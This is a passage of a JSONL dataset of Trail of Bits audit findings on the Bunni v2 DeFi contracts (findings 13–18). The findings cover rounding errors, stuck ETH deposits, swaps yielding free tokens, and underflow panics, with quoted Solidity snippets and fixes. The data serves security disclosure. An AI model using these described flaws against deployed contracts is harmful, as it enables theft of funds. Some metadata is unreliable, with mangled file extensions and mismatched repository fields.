([src/lib/QueryLDF.sol#L69–L77](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/QueryLDF.sol#L69-L77))*\n\n● If the cumulativeAmounts0/cumulativeAmounts1 functions round down, the resulting excess liquidity is rounded up since the cumulative amounts are used as the denominator:\n\n```\nuint256 excessLiquidity0 = balance0 > currentActiveBalance0\n ? (balance0 - currentActiveBalance0).divWad(\n bunniState.liquidityDensityFunction.cumulativeAmount0(\n input.key,\n minUsableTick,\n WAD,\n input.arithmeticMeanTick,\n input.updatedTick,\n bunniState.ldfParams,\n input.newLdfState\n )\n )\n : 0;\nuint256 excessLiquidity1 = balance1 > currentActiveBalance1\n ? (balance1 - currentActiveBalance1).divWad(\n bunniState.liquidityDensityFunction.cumulativeAmount1(\n input.key,\n maxUsableTick,\n WAD,\n input.arithmeticMeanTick,\n input.updatedTick,\n bunniState.ldfParams,\n input.newLdfState\n )\n )\n : 0;\n```\n\n*Figure 13.5: A snippet of the \\_computeRebalanceParams function ([src/lib/BunniHookLogic.sol#L591–L616](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniHookLogic.sol#L591-L616))*\n\n#### Recommendations\n\nShort term, review the system arithmetic and devise a systematic approach to rounding, ensuring rounding always favors the protocol. Implement smart contract fuzzing to determine the relative error bounds of each operation.\n\nLong term, explore whether exposing the rounding direction as an explicit parameter in higher-level functions may help to prevent these types of issues.\n", "severity": "Undetermined", "difficulty": "Low", "type": "Data Validation", "finding_id": "TOB-BUNNI-13", "target": {"path": "bunni-v2/src/*", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/timeless-fi/bunni-v2", "org": "timeless-fi", "name": "bunni-v2", "commit": "7faae4718eecda1b33dc3abd894431ed2d16c929", "branch": null, "relative_file": "bunni-v2/src/*", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-01-bacon-labs-bunniv2-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:21:00.930035+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:21:00.934897+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Undetermined", "Difficulty": "Low", "Type": "Data Validation", "Finding ID": "TOB-BUNNI-13", "Target": "bunni-v2/src/*"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2025-01-bacon-labs-bunniv2-securityreview-014", "doc_id": "trailofbits_2025-01-bacon-labs-bunniv2-securityreview", "finding_index": 14, "page_start": 53, "title": "Native assets deposited to pools with no native currencies are lost", "short_summary": null, "description_md": "#### Description\n\nNative assets deposited to pools with no native currencies are lost.\n\nThe deposit function of the BunniHub contract is payable since it needs to handle native assets if one of the tokens of the pool is a native token, as shown in figure 14.1:\n\n```\nfunction deposit(DepositParams calldata params)\n external\n payable\n virtual\n override\n nonReentrant\n checkDeadline(params.deadline)\n returns (uint256 shares, uint256 amount0, uint256 amount1)\n{\n return BunniHubLogic.deposit(\n s,\n BunniHubLogic.Env({\n weth: weth,\n permit2: permit2,\n poolManager: poolManager,\n bunniTokenImplementation: bunniTokenImplementation\n }),\n params\n );\n}\n```\n\n*Figure 14.1: The payable deposit function in BunniHub ([src/BunniHub.sol#L93–L112](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/BunniHub.sol#L93-L112))*\n\nIf a user provides an excess of native assets, the function will refund the difference back to the user, as shown in figure 14.2:\n\n```\nif (params.poolKey.currency0.isNative()) {\n if (address(this).balance != 0) {\n params.refundRecipient.safeTransferETH(\n FixedPointMathLib.min(address(this).balance, msg.value - amount0)\n );\n }\n```\n\n\n```\n} else if (params.poolKey.currency1.isNative()) {\n if (address(this).balance != 0) {\n params.refundRecipient.safeTransferETH(\n FixedPointMathLib.min(address(this).balance, msg.value - amount1)\n );\n }\n}\n```\n\n*Figure 14.2: A code snippet of the deposit function in BunniHubLogic ([src/lib/BunniHubLogic.sol#L172–L184](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniHubLogic.sol#L172-L184))*\n\nHowever, if the pool's currencies are both non-native and a user mistakenly provides a nonzero msg.value, this value will not be refunded and will remain in the BunniHub. Although this value can be withdrawn by deploying a new pool and abusing some of the calls, there is no direct and easy way to do this.\n", "full_markdown": "## 14. Native assets deposited to pools with no native currencies are lost\n\n| Severity: Informational           | Diffi culty: High        |\n|--------------------------------------|--------------------------------|\n| Type: Data Validation          | Finding ID: TOB-BUNNI-14 |\n| Target: src/lib/BunniHubLogic.sol |                                |\n\n#### Description\n\nNative assets deposited to pools with no native currencies are lost.\n\nThe deposit function of the BunniHub contract is payable since it needs to handle native assets if one of the tokens of the pool is a native token, as shown in figure 14.1:\n\n```\nfunction deposit(DepositParams calldata params)\n external\n payable\n virtual\n override\n nonReentrant\n checkDeadline(params.deadline)\n returns (uint256 shares, uint256 amount0, uint256 amount1)\n{\n return BunniHubLogic.deposit(\n s,\n BunniHubLogic.Env({\n weth: weth,\n permit2: permit2,\n poolManager: poolManager,\n bunniTokenImplementation: bunniTokenImplementation\n }),\n params\n );\n}\n```\n\n*Figure 14.1: The payable deposit function in BunniHub ([src/BunniHub.sol#L93–L112](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/BunniHub.sol#L93-L112))*\n\nIf a user provides an excess of native assets, the function will refund the difference back to the user, as shown in figure 14.2:\n\n```\nif (params.poolKey.currency0.isNative()) {\n if (address(this).balance != 0) {\n params.refundRecipient.safeTransferETH(\n FixedPointMathLib.min(address(this).balance, msg.value - amount0)\n );\n }\n```\n\n\n```\n} else if (params.poolKey.currency1.isNative()) {\n if (address(this).balance != 0) {\n params.refundRecipient.safeTransferETH(\n FixedPointMathLib.min(address(this).balance, msg.value - amount1)\n );\n }\n}\n```\n\n*Figure 14.2: A code snippet of the deposit function in BunniHubLogic ([src/lib/BunniHubLogic.sol#L172–L184](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniHubLogic.sol#L172-L184))*\n\nHowever, if the pool's currencies are both non-native and a user mistakenly provides a nonzero msg.value, this value will not be refunded and will remain in the BunniHub. Although this value can be withdrawn by deploying a new pool and abusing some of the calls, there is no direct and easy way to do this.\n\n#### Recommendations\n\nAdd a check to the deposit function of BunniHub that msg.value is zero if both pool tokens are non-native; otherwise, have the function revert.\n", "severity": "Informational", "difficulty": "High", "type": "Data Validation", "finding_id": "TOB-BUNNI-14", "target": {"path": "src/lib/BunniHubLogic.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/Uniswap/v4-core", "org": "Uniswap", "name": "v4-core", "commit": "9293e5ab1deed87e03c176d8af94b1af19eb3900", "branch": null, "relative_file": "src/lib/BunniHubLogic.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-01-bacon-labs-bunniv2-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:21:00.930035+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:21:00.934897+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "High", "Type": "Data Validation", "Finding ID": "TOB-BUNNI-14", "Target": "src/lib/BunniHubLogic.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2025-01-bacon-labs-bunniv2-securityreview-015", "doc_id": "trailofbits_2025-01-bacon-labs-bunniv2-securityreview", "finding_index": 15, "page_start": 55, "title": "Users can gain free tokens through the BunniSwap swap functionality", "short_summary": null, "description_md": "#### Description\n\nDuring token swaps, users can receive a nonzero amount of output tokens even when they provide zero input tokens, allowing them to acquire free tokens without contributing any input tokens for the swap.\n\nThe computeSwap function in the BunniSwapMath library executes swap operations based on a user-specified token amountSpecified as one of the inputs to the function. As shown in figure 15.1, depending on whether the amountSpecified is negative or positive, the swap is configured to be an ExactIn or ExactOut swap.\n\n```\n// initialize input and output amounts based on initial info\nbool exactIn = amountSpecified < 0;\ninputAmount = exactIn ? uint256(-amountSpecified) : 0;\noutputAmount = exactIn ? 0 : uint256(amountSpecified);\n```\n\n*Figure 15.1: Snippet of the function \\_computeSwap showing the computation of ExactIn and ExactOut ([src/lib/BunniSwapMath.sol#L101–L104](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniSwapMath.sol#L101-L104))*\n\nAs shown in figure 15.2, after a swap occurs, computeSwap returns the updated pool state and the amount of input tokens swapped by the user for the output tokens. The expectation is that, given a valid pool state, if the amountSpecified is nonzero, the swap should proceed, and if the output token amount is nonzero, the input token amount should also not be zero. In other words, users should not be able to acquire tokens for free. However, even if the user provides a nonzero amountSpecified during the swap, the function can still result in zero input tokens provided by the user while returning a nonzero amount of output tokens, enabling users to gain tokens for free during the swap.\n\n```\nfunction computeSwap(BunniComputeSwapInput calldata input,\nuint256 balance0, uint256 balance1)\n external\n view\n returns (uint160 updatedSqrtPriceX96, int24 updatedTick,\n uint256 inputAmount, uint256 outputAmount){\n uint256 outputTokenBalance = input.swapParams.zeroForOne ? balance1 : balance0;\n int256 amountSpecified = input.swapParams.amountSpecified;\n```\n\n\n```\n ...\n}\n```\n\n*Figure 15.2: Snippet of the computeSwap function in the library BunniSwapMath ([src/lib/BunniSwapMath.sol#L49–78](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniSwapMath.sol#L49-L78))*\n\nWe found this issue with Medusa during the invariant testing process.\n", "full_markdown": "# 15. Users can gain free tokens through the BunniSwap swap functionality\n\n| Severity: High                    | Diffi culty: High        |\n|--------------------------------------|--------------------------------|\n| Type: Data Validation          | Finding ID: TOB-BUNNI-15 |\n| src/lib/BunniSwapMath.col Target: |                                |\n\n#### Description\n\nDuring token swaps, users can receive a nonzero amount of output tokens even when they provide zero input tokens, allowing them to acquire free tokens without contributing any input tokens for the swap.\n\nThe computeSwap function in the BunniSwapMath library executes swap operations based on a user-specified token amountSpecified as one of the inputs to the function. As shown in figure 15.1, depending on whether the amountSpecified is negative or positive, the swap is configured to be an ExactIn or ExactOut swap.\n\n```\n// initialize input and output amounts based on initial info\nbool exactIn = amountSpecified < 0;\ninputAmount = exactIn ? uint256(-amountSpecified) : 0;\noutputAmount = exactIn ? 0 : uint256(amountSpecified);\n```\n\n*Figure 15.1: Snippet of the function \\_computeSwap showing the computation of ExactIn and ExactOut ([src/lib/BunniSwapMath.sol#L101–L104](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniSwapMath.sol#L101-L104))*\n\nAs shown in figure 15.2, after a swap occurs, computeSwap returns the updated pool state and the amount of input tokens swapped by the user for the output tokens. The expectation is that, given a valid pool state, if the amountSpecified is nonzero, the swap should proceed, and if the output token amount is nonzero, the input token amount should also not be zero. In other words, users should not be able to acquire tokens for free. However, even if the user provides a nonzero amountSpecified during the swap, the function can still result in zero input tokens provided by the user while returning a nonzero amount of output tokens, enabling users to gain tokens for free during the swap.\n\n```\nfunction computeSwap(BunniComputeSwapInput calldata input,\nuint256 balance0, uint256 balance1)\n external\n view\n returns (uint160 updatedSqrtPriceX96, int24 updatedTick,\n uint256 inputAmount, uint256 outputAmount){\n uint256 outputTokenBalance = input.swapParams.zeroForOne ? balance1 : balance0;\n int256 amountSpecified = input.swapParams.amountSpecified;\n```\n\n\n```\n ...\n}\n```\n\n*Figure 15.2: Snippet of the computeSwap function in the library BunniSwapMath ([src/lib/BunniSwapMath.sol#L49–78](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniSwapMath.sol#L49-L78))*\n\nWe found this issue with Medusa during the invariant testing process.\n\n#### Recommendations\n\nShort term, triage this issue's underlying root cause and deploy a fix such that swap functionality behaves as expected.\n\nLong term, consider integrating Medusa to generate invariants at both the function and system levels, enabling the testing of operations that involve complex mathematics and liquidity pricing curves.\n", "severity": "High", "difficulty": "High", "type": "Data Validation", "finding_id": "TOB-BUNNI-15", "target": {"path": "src/lib/BunniSwapMath.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/Uniswap/v4-core", "org": "Uniswap", "name": "v4-core", "commit": "9293e5ab1deed87e03c176d8af94b1af19eb3900", "branch": null, "relative_file": "src/lib/BunniSwapMath.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-01-bacon-labs-bunniv2-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:21:00.930035+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:21:00.934897+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": "High", "Type": "Data Validation", "Finding ID": "TOB-BUNNI-15", "Target": "src/lib/BunniSwapMath.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2025-01-bacon-labs-bunniv2-securityreview-016", "doc_id": "trailofbits_2025-01-bacon-labs-bunniv2-securityreview", "finding_index": 16, "page_start": 57, "title": "Users can gain tokens during round-trip swaps", "short_summary": null, "description_md": "#### Description\n\nThe swap functionality of BunniSwapMath library is not accurately implemented, allowing users to gain tokens during round-trip swaps (i.e., swapping token0 for token1 and then swapping the same amount of token1 for token0).\n\nThe computeSwap function in the BunniSwapMath library allows users to swap tokens on a valid pool state. Given an amountSpecified and the swap direction, the function calculates the input tokens exchanged for the output tokens. In a zeroForOne swap, the user exchanges token0 for token1, and the pool state is updated to reflect the new token balances and price ratio, as shown in figure 16.1.\n\n```\nfunction computeSwap(BunniComputeSwapInput calldata input,\nuint256 balance0, uint256 balance1)\n external\n view\n returns (uint160 updatedSqrtPriceX96, int24 updatedTick,\n uint256 inputAmount, uint256 outputAmount)\n{\n uint256 outputTokenBalance = input.swapParams.zeroForOne ? balance1 : balance0;\n int256 amountSpecified = input.swapParams.amountSpecified;\n ...\n // compute first pass result\n (updatedSqrtPriceX96, updatedTick, inputAmount, outputAmount) =\n _computeSwap(input, amountSpecified);\n ...\n}\n```\n\n*Figure 16.1: Snippet of the computeSwap function in the BunniSwapMath library showing the updated pool state ([src/lib/BunniSwapMath.sol#L49–78](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniSwapMath.sol#L49-L78))*\n\nIf the user then performs a OneForZero swap—exchanging the previously gained token1 for token0—the expectation is that the user should receive the same amount of token0 they initially provided. However, due to the incorrect implementation of computeSwap, the input tokens received after the OneForZero swap exceed the expected amount, allowing users to gain tokens during round-trip swaps.\n\n\nThis is, in part, due to the updatedTick never being initialized when both branches in the highlighted lines of figure 16.2 are skipped.\n\n```\nif (\n (zeroForOne && sqrtPriceLimitX96 <= leastChangeSqrtPriceX96)\n || (!zeroForOne && sqrtPriceLimitX96 >= leastChangeSqrtPriceX96)\n) {\n // ...\n if (naiveSwapResultSqrtPriceX96 == sqrtPriceNextX96) {\n // Equivalent to `updatedTick = zeroForOne ? tickNext - 1 : tickNext;`\n unchecked {\n // cannot cast a bool to an int24 in Solidity\n int24 _zeroForOne;\n assembly {\n _zeroForOne := zeroForOne\n }\n updatedTick = tickNext - _zeroForOne;\n }\n } else if (naiveSwapResultSqrtPriceX96 != startSqrtPriceX96) {\n // recompute unless we're on a lower tick boundary (i.e. already\ntransitioned ticks), and haven't moved\n updatedTick = TickMath.getTickAtSqrtPrice(naiveSwapResultSqrtPriceX96);\n }\n // ...\n return (updatedSqrtPriceX96, updatedTick, inputAmount, outputAmount);\n```\n\n*Figure 16.1: Snippet of the \\_computeSwap function in the BunniSwapMath library ([src/lib/BunniSwapMath.sol#L228–L302](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniSwapMath.sol#L228-L302))*\n\nWe found this issue with Medusa during the invariant testing process.\n", "full_markdown": "| 16. Users can gain tokens during round-trip swaps |                        |\n|------------------------------------------------------------------------|------------------------|\n| Severity: High                                                      | Diffi culty: Low |\n| Type: Data Validation Finding ID: TOB-BUNNI-16          |                        |\n| Target: src/lib/BunniSwapMath.col                                   |                        |\n\n#### Description\n\nThe swap functionality of BunniSwapMath library is not accurately implemented, allowing users to gain tokens during round-trip swaps (i.e., swapping token0 for token1 and then swapping the same amount of token1 for token0).\n\nThe computeSwap function in the BunniSwapMath library allows users to swap tokens on a valid pool state. Given an amountSpecified and the swap direction, the function calculates the input tokens exchanged for the output tokens. In a zeroForOne swap, the user exchanges token0 for token1, and the pool state is updated to reflect the new token balances and price ratio, as shown in figure 16.1.\n\n```\nfunction computeSwap(BunniComputeSwapInput calldata input,\nuint256 balance0, uint256 balance1)\n external\n view\n returns (uint160 updatedSqrtPriceX96, int24 updatedTick,\n uint256 inputAmount, uint256 outputAmount)\n{\n uint256 outputTokenBalance = input.swapParams.zeroForOne ? balance1 : balance0;\n int256 amountSpecified = input.swapParams.amountSpecified;\n ...\n // compute first pass result\n (updatedSqrtPriceX96, updatedTick, inputAmount, outputAmount) =\n _computeSwap(input, amountSpecified);\n ...\n}\n```\n\n*Figure 16.1: Snippet of the computeSwap function in the BunniSwapMath library showing the updated pool state ([src/lib/BunniSwapMath.sol#L49–78](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniSwapMath.sol#L49-L78))*\n\nIf the user then performs a OneForZero swap—exchanging the previously gained token1 for token0—the expectation is that the user should receive the same amount of token0 they initially provided. However, due to the incorrect implementation of computeSwap, the input tokens received after the OneForZero swap exceed the expected amount, allowing users to gain tokens during round-trip swaps.\n\n\nThis is, in part, due to the updatedTick never being initialized when both branches in the highlighted lines of figure 16.2 are skipped.\n\n```\nif (\n (zeroForOne && sqrtPriceLimitX96 <= leastChangeSqrtPriceX96)\n || (!zeroForOne && sqrtPriceLimitX96 >= leastChangeSqrtPriceX96)\n) {\n // ...\n if (naiveSwapResultSqrtPriceX96 == sqrtPriceNextX96) {\n // Equivalent to `updatedTick = zeroForOne ? tickNext - 1 : tickNext;`\n unchecked {\n // cannot cast a bool to an int24 in Solidity\n int24 _zeroForOne;\n assembly {\n _zeroForOne := zeroForOne\n }\n updatedTick = tickNext - _zeroForOne;\n }\n } else if (naiveSwapResultSqrtPriceX96 != startSqrtPriceX96) {\n // recompute unless we're on a lower tick boundary (i.e. already\ntransitioned ticks), and haven't moved\n updatedTick = TickMath.getTickAtSqrtPrice(naiveSwapResultSqrtPriceX96);\n }\n // ...\n return (updatedSqrtPriceX96, updatedTick, inputAmount, outputAmount);\n```\n\n*Figure 16.1: Snippet of the \\_computeSwap function in the BunniSwapMath library ([src/lib/BunniSwapMath.sol#L228–L302](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniSwapMath.sol#L228-L302))*\n\nWe found this issue with Medusa during the invariant testing process.\n\n#### Recommendations\n\nShort term, initialize the updatedTick to the correct value when the branches in figure 16.2 are skipped. Run the invariant tests again with the updated code and triage any outstanding invariant failures.\n\nLong term, consider integrating Medusa to generate invariants at both the function and system levels, enabling the testing of operations that involve complex mathematics and liquidity pricing curves.\n", "severity": "High", "difficulty": "Low", "type": "Data Validation", "finding_id": "TOB-BUNNI-16", "target": {"path": "src/lib/BunniSwapMath.col", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/Uniswap/v4-core", "org": "Uniswap", "name": "v4-core", "commit": "9293e5ab1deed87e03c176d8af94b1af19eb3900", "branch": null, "relative_file": "src/lib/BunniSwapMath.col", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-01-bacon-labs-bunniv2-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:21:00.930035+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:21:00.934897+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": "Low", "Type": "Data Validation", "Finding ID": "TOB-BUNNI-16", "Target": "src/lib/BunniSwapMath.col"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2025-01-bacon-labs-bunniv2-securityreview-017", "doc_id": "trailofbits_2025-01-bacon-labs-bunniv2-securityreview", "finding_index": 17, "page_start": 59, "title": "Dierent amount of input/output tokens can be returned in ExactIn and ExactOut configurations during the swap", "short_summary": null, "description_md": "#### Description\n\nThe swap functionality of BunniSwapMath can yield different input and output token amounts on the same pool state, depending on the swap configuration (ExactIn or ExactOut). This enables users to provide fewer tokens by choosing one configuration over the other.\n\nThe computeSwap function in the BunniSwapMath library enables users to swap tokens on a valid pool state. Based on the amountSpecified and swap direction, it determines the input tokens exchanged for output tokens. If the amountSpecified is negative, the swap is an ExactIn swap, meaning the function calculates the amount of output tokens for an amountSpecified input token amount. Conversely, if the amountSpecified is positive, the swap is an ExactOut swap, where the function determines the required input tokens for an amountSpecified output token amount, as shown in the figure 17.1.\n\n```\n// initialize input and output amounts based on initial info\nbool exactIn = amountSpecified < 0;\ninputAmount = exactIn ? uint256(-amountSpecified) : 0;\noutputAmount = exactIn ? 0 : uint256(amountSpecified);\n```\n\n*Figure 17.1: Snippet of the function \\_computeSwap showing the computation of ExactIn and ExactOut ([src/lib/BunniSwapMath.sol#L101–L104](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniSwapMath.sol#L101-L104))*\n\nThe expectation is that, for the same pool state, both swap configurations (ExactIn and ExactOut) should result in the same amounts of input and output tokens. However, the computeSwap function deviates from this expected behavior. For example, in an ExactIn configuration, computeSwap may exchange x amount of input tokens for y output tokens, but in an ExactOut configuration, it may exchange x' input tokens for the same y output tokens, where x' is smaller than x. This allows users to provide fewer input tokens in the ExactOut configuration for the same amount of y tokens compared to an ExactIn swap.\n\nWe found this issue with Medusa during the invariant testing process.\n", "full_markdown": "## 17. Dierent amount of input/output tokens can be returned in ExactIn and ExactOut configurations during the swap\n\n| Severity: Low                     | Diffi culty: Low         |\n|--------------------------------------|--------------------------------|\n| Type: Data Validation          | Finding ID: TOB-BUNNI-17 |\n| Target: src/lib/BunniSwapMath.col |                                |\n\n#### Description\n\nThe swap functionality of BunniSwapMath can yield different input and output token amounts on the same pool state, depending on the swap configuration (ExactIn or ExactOut). This enables users to provide fewer tokens by choosing one configuration over the other.\n\nThe computeSwap function in the BunniSwapMath library enables users to swap tokens on a valid pool state. Based on the amountSpecified and swap direction, it determines the input tokens exchanged for output tokens. If the amountSpecified is negative, the swap is an ExactIn swap, meaning the function calculates the amount of output tokens for an amountSpecified input token amount. Conversely, if the amountSpecified is positive, the swap is an ExactOut swap, where the function determines the required input tokens for an amountSpecified output token amount, as shown in the figure 17.1.\n\n```\n// initialize input and output amounts based on initial info\nbool exactIn = amountSpecified < 0;\ninputAmount = exactIn ? uint256(-amountSpecified) : 0;\noutputAmount = exactIn ? 0 : uint256(amountSpecified);\n```\n\n*Figure 17.1: Snippet of the function \\_computeSwap showing the computation of ExactIn and ExactOut ([src/lib/BunniSwapMath.sol#L101–L104](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniSwapMath.sol#L101-L104))*\n\nThe expectation is that, for the same pool state, both swap configurations (ExactIn and ExactOut) should result in the same amounts of input and output tokens. However, the computeSwap function deviates from this expected behavior. For example, in an ExactIn configuration, computeSwap may exchange x amount of input tokens for y output tokens, but in an ExactOut configuration, it may exchange x' input tokens for the same y output tokens, where x' is smaller than x. This allows users to provide fewer input tokens in the ExactOut configuration for the same amount of y tokens compared to an ExactIn swap.\n\nWe found this issue with Medusa during the invariant testing process.\n\n\n\n#### Recommendations\n\nShort term, triage the underlying root cause of the above finding and deploy a fix such that ExactIn and ExactOut swaps behave as expected.\n\nLong term, consider integrating Medusa to generate invariants at both the function and system levels, enabling the testing of operations that involve complex mathematics and liquidity pricing curves.\n", "severity": "Low", "difficulty": "Low", "type": "Data Validation", "finding_id": "TOB-BUNNI-17", "target": {"path": "src/lib/BunniSwapMath.col", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/Uniswap/v4-core", "org": "Uniswap", "name": "v4-core", "commit": "9293e5ab1deed87e03c176d8af94b1af19eb3900", "branch": null, "relative_file": "src/lib/BunniSwapMath.col", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-01-bacon-labs-bunniv2-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:21:00.930035+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:21:00.934897+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": "Low", "Type": "Data Validation", "Finding ID": "TOB-BUNNI-17", "Target": "src/lib/BunniSwapMath.col"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2025-01-bacon-labs-bunniv2-securityreview-018", "doc_id": "trailofbits_2025-01-bacon-labs-bunniv2-securityreview", "finding_index": 18, "page_start": 61, "title": "BunniSwap swap functionality can cause panics during the swap", "short_summary": null, "description_md": "#### Description\n\nThe swap functionality of BunniSwapMath can result in arithmetic underflow during the swap on a valid pool state, disrupting swap operations.\n\nThe computeSwap function in the BunniSwapMath library enables users to swap tokens on a valid pool state. Based on the amountSpecified and swap direction, it calculates the input tokens exchanged for output tokens and updates the pool's state and pricing ratio at the end of the swap.\n\n```\n(inputAmount, outputAmount) = zeroForOne\n ? (\n updatedActiveBalance0 - currentActiveBalance0,\n currentActiveBalance1 < updatedActiveBalance1 ? 0 : currentActiveBalance1 -\nupdatedActiveBalance1\n )\n : (\n updatedActiveBalance1 - currentActiveBalance1,\n currentActiveBalance0 < updatedActiveBalance0 ? 0 : currentActiveBalance0 -\nupdatedActiveBalance0\n );\n```\n\n*Figure 18.1: Snippet of the \\_computeSwap function ([src/lib/BunniSwapMath.sol#L326–334](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniSwapMath.sol#L326-L334))*\n\nGiven a valid pool state and input parameters for the computeSwap function, the swap should succeed. However, BunniSwapMath deviates from this expected behavior, leading to an arithmetic underflow during the swap. For a OneForZero swap, during the calculation of input and output amount, the updatedActiveBalance for token1 becomes less than the currentActiveBalance of token1; this condition is not accounted for, as highlighted in figure 18.1. This results in an arithmetic underflow that causes the swap operation to revert.\n\nWe discovered this issue with Medusa during the invariant testing process.\n", "full_markdown": "| 18. BunniSwap swap functionality can cause panics during the swap |                                |  |\n|----------------------------------------------------------------------------------------------|--------------------------------|--|\n| Severity: Undetermined                                                                    | Diffi culty: High        |  |\n| Type: Data Validation                                                                  | Finding ID: TOB-BUNNI-18 |  |\n| Target: src/lib/BunniSwapMath.col                                                         |                                |  |\n\n#### Description\n\nThe swap functionality of BunniSwapMath can result in arithmetic underflow during the swap on a valid pool state, disrupting swap operations.\n\nThe computeSwap function in the BunniSwapMath library enables users to swap tokens on a valid pool state. Based on the amountSpecified and swap direction, it calculates the input tokens exchanged for output tokens and updates the pool's state and pricing ratio at the end of the swap.\n\n```\n(inputAmount, outputAmount) = zeroForOne\n ? (\n updatedActiveBalance0 - currentActiveBalance0,\n currentActiveBalance1 < updatedActiveBalance1 ? 0 : currentActiveBalance1 -\nupdatedActiveBalance1\n )\n : (\n updatedActiveBalance1 - currentActiveBalance1,\n currentActiveBalance0 < updatedActiveBalance0 ? 0 : currentActiveBalance0 -\nupdatedActiveBalance0\n );\n```\n\n*Figure 18.1: Snippet of the \\_computeSwap function ([src/lib/BunniSwapMath.sol#L326–334](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniSwapMath.sol#L326-L334))*\n\nGiven a valid pool state and input parameters for the computeSwap function, the swap should succeed. However, BunniSwapMath deviates from this expected behavior, leading to an arithmetic underflow during the swap. For a OneForZero swap, during the 